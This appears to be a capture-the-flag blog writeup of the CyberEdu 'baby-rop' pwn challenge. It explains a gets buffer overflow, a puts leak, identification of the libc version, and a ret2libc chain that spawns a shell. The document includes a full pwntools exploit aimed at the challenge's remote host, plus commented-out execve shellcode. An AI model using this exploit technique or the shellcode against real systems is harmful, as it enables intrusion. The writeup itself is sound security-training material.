+++
date = '2026-05-01'
draft = false
title = 'CyberEdu baby-rop Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn"]
+++

## Challenge overview

This is a simple pwn challenge. You should get it in the lunch break.

Running on Ubuntu 20.04.

---

I copied the template from a challenge I solved last year (baby-fmt) and I had *12 pictures* attached to the post... I used to have quite a lot of free time back then :)

And I switched from `gef` to `pwndbg` a couple days ago.


## Identifying the vulnerabilities

By the looks of it, we have a no PIE, no canary with a buffer overflow. So just a ret2libc I suppose. Except there's a bunch of garbage on the stack, so I set up a breakpoint after the `gets` and looked at where our stuff ends up.

The stupidest thing happened which took me about 40 minutes until I gave up (now), since for some reason the breakpoint wouldn't pop in my python exploit, and only while running THE EXACT SAME THING with `gdb ./file`. 

So I tested it with a bp before and after `gets` was called, manually. I found out two things:

`pwndbg> x/10gx $rsp: 0x7fffffffd850: 0x0000000061676167`

`pwndbg> x/x $rbp - $rsp: 0x100`

So after sending a `print("A"*0x100+"B"*8)`, the next value we enter will be passed into `$rip`. So, pop rdi ret, puts got, puts plt, main. I got the puts leak successfully, so now we only need to localize the libc version using blukat.me. The challenge was created two years ago, with the lastest libc being 2.39 at the time, so I'll go with that.

My assumption was wrong, so I just tried all the libc versions older than that, until I reached `libc6_2.31-0ubuntu7_amd64`:

![challenge-screenshot](flag.png#center)

## The exploit

```python
from pwn import *
import time
elf = ELF('/home/kali/Downloads/pwn_baby_rop')
#p=elf.process()

cyberedu = '35.246.235.205:30728'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
# read hex leak: 
# pie_leak = int(pie_leak, 16)

# read hex bytes: 
# val = u64(data.ljust(8, b"\x00"))

#local testing, run normally
#remote testing, run python3 exploit.py REMOTE

#strings libc.so.6 | grep "GNU C Library"
#strings libc.so.6 | grep "release version"

#print(".".join(f"%{i}$p" for i in range(1, 51)))
#shell = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' shortest shell

pop_rdi_ret = 0x401663
ret = 0x40101a
puts_got = elf.got[b'puts']
puts_plt = elf.plt[b'puts']
main = 0x040145c
print(f"puts_got is {hex(puts_got)} and puts_plt is {hex(puts_plt)}")

payload = ( b"A"*0x100 +
            b"B"*8 + 
            p64(pop_rdi_ret) +
            p64(puts_got) +
            p64(puts_plt) +
            p64(main)
          )
#gdb.attach(p, gdbscript = 'b * 0x4012bf')

p.recvuntil(b"magic.\n")
p.sendline(payload)

data = p.recvline().strip()
val = u64(data.ljust(8, b"\x00"))

print(f"Found puts at {hex(val)}")

io_puts_offset = 0x0875a0
system_offset = 0x055410
binsh_offset = 0x1b75aa

libc = val - io_puts_offset
system = libc + system_offset
binsh = libc + binsh_offset

print(f"Found libc at {hex(libc)}")

payload = ( b"A"*0x100 +
            b"B"*8 + 
            p64(pop_rdi_ret) +
            p64(binsh) +
            p64(ret) +
            p64(system)
          )
          
p.recvuntil(b"magic.\n")
p.sendline(payload)

p.interactive()
```

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/babyrop.py)**.
